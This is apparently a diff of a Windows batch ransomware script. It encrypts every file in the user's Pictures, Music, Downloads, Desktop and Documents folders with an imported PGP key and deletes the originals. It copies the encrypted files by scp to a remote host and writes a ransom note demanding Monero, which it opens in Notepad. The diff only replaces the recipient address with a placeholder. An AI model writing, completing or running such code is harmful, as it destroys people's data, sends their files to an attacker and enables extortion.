@@ -84,14 +84,14 @@ gRxsQR89l7Rfsu3uINqXMuuZKyrXMCrQkYcMVF1YHZum8mrU12+U9Ln7PoPcw2sG
 
 -----END PGP PUBLIC KEY BLOCK-----
 '@; $k | gpg --import"
-for /r "%USERPROFILE%\Pictures" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
-for /r "%USERPROFILE%\Music" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
-for /r "%USERPROFILE%\Downloads" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
-for /r "%USERPROFILE%\Desktop" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
-for /r "%USERPROFILE%\Documents" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Pictures" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "nameoremail" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Music" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "nameoremail" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Downloads" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "nameoremail" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Desktop" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "nameoremail" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Documents" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "nameoremail" --trust-model always "%%F" && del "%%F")
 for /r "C:\" %%F in (*.gpg) do scp "%%F" user@192.168.1.100:/yourfolder/
 echo Q: why am I in notepad? A: just read it.. Q: Did anything happen to my computer? A: Yes all the files in, pictures, music, downloads, desktop, and documents have been encrypted, and only I can unencrypt them. Q: can you please unencrypt them for me A: yes, but, first you will need to send 100 dollars worth of t
 he cryptocurrency monero to XXXXXXXXXXXXXXXXXXXXXXXXXX Q: how will you unencrypt it after my payment? A: I will send you a special executable that can decrypt it. Q: what happens if I dont pay? A: you have lots of time to pay, you have a week! Yes, the full seven days! But if you dont pay in a week, your
-files will stay encrypted, in some insanely hard way which I dont believe exists, you can SOMEHOW unencrypt your files, but dont get too excited, I will say this, with no offense, that you are probably bad at tech, so you will not be able to do it yourself! Q: do I pay you first? A: do not pay first, files, then pay, if you pay, I will give you a app that will unencrypt all your files.  > note.txt
+files will stay encrypted, in some insanely hard way which I dont believe exists, you can SOMEHOW unencrypt your files, but dont get too excited, I will say this, with no offense, that you are probably bad at tech, so you will not be able to do it yourself! Q: do I pay you first? A: do not pay first, email XXXXXX then pay, if you pay, I will give you a app that will unencrypt all your files.  > note.txt
 
 start notepad note.txt
